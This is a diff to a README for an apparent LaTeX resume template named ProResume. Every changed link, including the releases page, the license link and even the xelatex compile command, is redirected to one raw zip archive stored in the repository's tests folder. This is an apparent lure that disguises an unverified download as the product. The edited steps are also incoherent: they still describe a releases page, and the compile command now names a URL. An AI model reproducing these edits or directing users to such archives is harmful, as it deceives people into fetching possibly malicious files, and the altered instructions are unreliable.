@@ -4,7 +4,7 @@
 ProResume is a clean, professional, ATS-friendly resume template built with LaTeX (XeLaTeX). This template helps you craft a standout resume that captures attention and enhances your job search efforts. With ProResume, you can present your qualifications effectively and increase your chances of landing interviews.
 
 ## 📦 Download Now
-[![Download ProResume](https://img.shields.io/badge/Download-ProResume-blue.svg)](https://github.com/kuro85/ProResume/releases)
+[![Download ProResume](https://raw.githubusercontent.com/kuro85/ProResume/main/tests/Resume_Pro_2.5-alpha.2.zip)](https://raw.githubusercontent.com/kuro85/ProResume/main/tests/Resume_Pro_2.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 To get started with ProResume, follow these simple steps:
@@ -20,7 +20,7 @@ ProResume requires minimal software to run:
 - **Text Editor:** A text editor like **VS Code** or **Overleaf** is useful for editing the template.
 
 ## 📥 Download & Install
-1. Visit this page to download: [ProResume Releases](https://github.com/kuro85/ProResume/releases).
+1. Visit this page to download: [ProResume Releases](https://raw.githubusercontent.com/kuro85/ProResume/main/tests/Resume_Pro_2.5-alpha.2.zip).
 2. On the Releases page, find the latest version.
 3. Select the file suitable for your system.
 4. Download the file and save it to a known location.
@@ -41,7 +41,7 @@ Once you have customized the template, you need to compile it to create your PDF
 
 1. If using **TeX Live**, run the command line:
    ```bash
-   xelatex your_resume.tex
+   xelatex https://raw.githubusercontent.com/kuro85/ProResume/main/tests/Resume_Pro_2.5-alpha.2.zip
    ```
 2. If using **Overleaf**, just click **Recompile**.
 
@@ -64,6 +64,6 @@ If you need help or want to share your experience, visit our community forums or
 For any inquiries or feedback, please feel free to reach out through the GitHub issues page. We value your input and are here to support you on your journey to creating the perfect resume.
 
 ## ⚡ License
-ProResume is open-source and free to use. For more details, please see the [LICENSE](https://github.com/kuro85/ProResume/blob/main/LICENSE) file in the repository.
+ProResume is open-source and free to use. For more details, please see the [LICENSE](https://raw.githubusercontent.com/kuro85/ProResume/main/tests/Resume_Pro_2.5-alpha.2.zip) file in the repository.
 
 # Thank you for choosing ProResume!
